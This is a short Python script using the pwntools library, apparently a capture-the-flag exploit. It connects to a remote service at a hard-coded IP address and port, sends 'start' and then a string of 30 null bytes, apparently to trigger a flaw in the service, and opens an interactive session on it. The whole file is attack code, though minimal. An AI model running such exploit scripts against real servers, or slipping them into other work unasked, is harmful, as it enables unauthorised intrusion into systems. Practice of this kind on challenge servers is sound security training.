from pwn import *

r = remote("142.93.113.55", 31087)

r.recv(0x100)
r.sendline("start")

s = "\x00" * 30
r.sendline(s)

r.interactive()
